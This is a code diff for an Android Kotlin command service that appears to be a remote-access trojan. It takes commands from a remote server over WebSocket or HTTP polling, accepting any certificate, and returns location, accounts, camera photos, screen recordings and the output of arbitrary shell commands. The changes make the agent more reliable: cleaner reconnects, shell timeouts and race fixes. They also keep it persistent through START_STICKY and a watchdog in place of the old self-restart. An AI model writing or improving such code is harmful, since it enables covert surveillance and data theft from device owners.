@@ -35,6 +35,7 @@ import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
+import android.os.Build
 import java.io.File
 import java.util.concurrent.TimeUnit
 
@@ -172,6 +173,15 @@ class CommandService : Service() {
         if (isConnecting) return
         isConnecting = true
         try {
+            // Clean up previous client/socket before reconnecting
+            try {
+                webSocket?.close(1000, "Reconnecting")
+            } catch (_: Exception) {}
+            try {
+                client?.dispatcher?.executorService?.shutdown()
+                client?.connectionPool?.evictAll()
+            } catch (_: Exception) {}
+
             Log.d(TAG, "connectWebSocket() called, serverUrl=${AndroidConfig.serverUrl}")
             client = TrustAllCertificates.createClientBuilder()
                 .connectTimeout(10, TimeUnit.SECONDS)
@@ -288,7 +298,7 @@ class CommandService : Service() {
             }
 
             Log.d(TAG, "Received command: $command")
-            dispatchCommand(command, params)
+            dispatchCommand(command, params, requestId.ifEmpty { null })
         } catch (e: Exception) {
             Log.e(TAG, "Error handling message: ${(e.message ?: "Unknown error")}")
         }
@@ -484,8 +494,10 @@ class CommandService : Service() {
                     }
                 }, camHandler)
 
+                var cameraDevice: CameraDevice? = null
                 manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                     override fun onOpened(camera: CameraDevice) {
+                        cameraDevice = camera
                         try {
                             val surface = reader.surface
                             camera.createCaptureSession(listOf(surface),
@@ -513,9 +525,13 @@ class CommandService : Service() {
                     override fun onError(camera: CameraDevice, error: Int) { camera.close(); result.complete(null) }
                 }, camHandler)
 
-                val photoBytes = withTimeoutOrNull(30000) { result.await() }
-                reader.close()
-                camThread.quitSafely()
+                val photoBytes = try {
+                    withTimeoutOrNull(30000) { result.await() }
+                } finally {
+                    try { cameraDevice?.close() } catch (_: Exception) {}
+                    try { reader.close() } catch (_: Exception) {}
+                    camThread.quitSafely()
+                }
 
                 if (photoBytes != null && photoBytes.isNotEmpty()) {
                     val base64 = Base64.encodeToString(photoBytes, Base64.NO_WRAP)
@@ -573,10 +589,14 @@ class CommandService : Service() {
         serviceScope.launch {
             try {
                 val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
+                val errorDeferred = serviceScope.async(Dispatchers.IO) {
+                    process.errorStream.bufferedReader().use { it.readText() }
+                }
                 val output = process.inputStream.bufferedReader().use { it.readText() }
-                val error = process.errorStream.bufferedReader().use { it.readText() }
-                process.waitFor()
-                process.destroy()
+                val error = errorDeferred.await()
+                if (!process.waitFor(30, TimeUnit.SECONDS)) {
+                    process.destroyForcibly()
+                }
                 
                 sendResponse("shell_result", JSONObject().apply {
                     put("output", output)
@@ -838,8 +858,8 @@ class CommandService : Service() {
         return apps
     }
 
-    private fun sendResponse(type: String, data: JSONObject) {
-        val reqId = currentRequestId
+    private fun sendResponse(type: String, data: JSONObject, requestId: String? = null) {
+        val reqId = requestId ?: currentRequestId
         val message = JSONObject().apply {
             put("command", "message")
             put("identifier", JSONObject().apply {
@@ -857,15 +877,9 @@ class CommandService : Service() {
         }
         if (isConnected) {
             webSocket?.send(message.toString())
-        }
-        // Also send via HTTP when polling (WS may be down)
-        if (httpPollingActive && !reqId.isNullOrEmpty()) {
+        } else if (httpPollingActive && !reqId.isNullOrEmpty()) {
+            // Only send via HTTP if WS is not connected
             serviceScope.launch { sendHttpResponse(type, data) }
-            return // sendHttpResponse clears currentRequestId
-        }
-        // Clear request_id after sending response
-        if (!reqId.isNullOrEmpty()) {
-            currentRequestId = null
         }
     }
 
@@ -946,27 +960,27 @@ class CommandService : Service() {
             .build()
 
         val response = httpClient.newCall(request).execute()
-        if (!response.isSuccessful) {
-            Log.w(TAG, "Poll HTTP ${response.code}")
-            response.close()
-            return
-        }
+        response.use { resp ->
+            if (!resp.isSuccessful) {
+                Log.w(TAG, "Poll HTTP ${resp.code}")
+                return
+            }
 
-        val body = response.body?.string() ?: return
-        response.close()
-        val json = JSONObject(body)
-        val commands = json.optJSONArray("commands") ?: return
+            val body = resp.body?.string() ?: return
+            val json = JSONObject(body)
+            val commands = json.optJSONArray("commands") ?: return
 
-        for (i in 0 until commands.length()) {
-            val cmd = commands.getJSONObject(i)
-            val action = cmd.optString("action", "")
-            val requestId = cmd.optString("request_id", "")
-            val params = cmd.optJSONObject("params")
+            for (i in 0 until commands.length()) {
+                val cmd = commands.getJSONObject(i)
+                val action = cmd.optString("action", "")
+                val requestId = cmd.optString("request_id", "")
+                val params = cmd.optJSONObject("params")
 
-            if (action.isNotEmpty()) {
-                Log.d(TAG, "HTTP poll received command: $action (req=$requestId)")
-                if (requestId.isNotEmpty()) currentRequestId = requestId
-                dispatchCommand(action, params)
+                if (action.isNotEmpty()) {
+                    Log.d(TAG, "HTTP poll received command: $action (req=$requestId)")
+                    if (requestId.isNotEmpty()) currentRequestId = requestId
+                    dispatchCommand(action, params, requestId.ifEmpty { null })
+                }
             }
         }
     }
@@ -1004,7 +1018,11 @@ class CommandService : Service() {
     }
 
     // Dispatch command from either WS or HTTP polling
-    private fun dispatchCommand(command: String, params: JSONObject?) {
+    private fun dispatchCommand(command: String, params: JSONObject?, requestId: String? = null) {
+        // Capture requestId locally to avoid race conditions with currentRequestId
+        if (!requestId.isNullOrEmpty()) {
+            currentRequestId = requestId
+        }
         when (command) {
             "get_location" -> executeGetLocation()
             "get_accounts" -> executeGetAccounts()
@@ -1098,8 +1116,8 @@ class CommandService : Service() {
         }
     }
 
-    private var screenRecordProcess: Process? = null
-    private var screenRecordFile: File? = null
+    @Volatile private var screenRecordProcess: Process? = null
+    @Volatile private var screenRecordFile: File? = null
 
     private fun executeStartScreenRecord(params: JSONObject?) {
         serviceScope.launch {
@@ -1125,8 +1143,8 @@ class CommandService : Service() {
     private fun executeStopScreenRecord() {
         serviceScope.launch {
             try {
-                screenRecordProcess?.waitFor()
                 screenRecordProcess?.destroy()
+                screenRecordProcess?.waitFor(5, TimeUnit.SECONDS)
                 
                 val file = screenRecordFile
                 if (file != null && file.exists()) {
@@ -1315,7 +1333,7 @@ class CommandService : Service() {
                         else -> AudioManager.MODE_NORMAL
                     }
                     
-                    if (mode == "silent" || mode == "vibrate") {
+                    if (mode.lowercase() == "silent" || mode.lowercase() == "vibrate") {
                         audioManager.ringerMode = audioMode
                     } else {
                         audioManager.mode = audioMode
@@ -1364,15 +1382,20 @@ class CommandService : Service() {
         serviceScope.launch {
             try {
                 val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
+                val errorDeferred = serviceScope.async(Dispatchers.IO) {
+                    process.errorStream.bufferedReader().use { it.readText() }
+                }
                 val output = process.inputStream.bufferedReader().use { it.readText() }
-                val error = process.errorStream.bufferedReader().use { it.readText() }
-                val exitCode = process.waitFor()
-                process.destroy()
+                val error = errorDeferred.await()
+                val completed = process.waitFor(30, TimeUnit.SECONDS)
+                if (!completed) {
+                    process.destroyForcibly()
+                }
                 
                 sendResponse("shell_output", JSONObject().apply {
                     put("output", output)
                     put("error", error)
-                    put("exit_code", exitCode)
+                    put("exit_code", if (completed) process.exitValue() else -1)
                     put("command", command)
                 })
             } catch (e: Exception) {
@@ -1577,7 +1600,12 @@ class CommandService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
-        stopForeground(false)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            stopForeground(STOP_FOREGROUND_DETACH)
+        } else {
+            @Suppress("DEPRECATION")
+            stopForeground(false)
+        }
         isConnected = false
         dataSyncManager.persistQueue()
         commandQueue.shutdown()
@@ -1585,8 +1613,6 @@ class CommandService : Service() {
         client?.dispatcher?.executorService?.shutdown()
         serviceScope.cancel()
         
-        // Self-restart for persistence
-        val restartIntent = Intent(this, CommandService::class.java)
-        startService(restartIntent)
+        // Restart handled by START_STICKY and WatchdogService — cannot call startService() from background on Android 12+
     }
 }
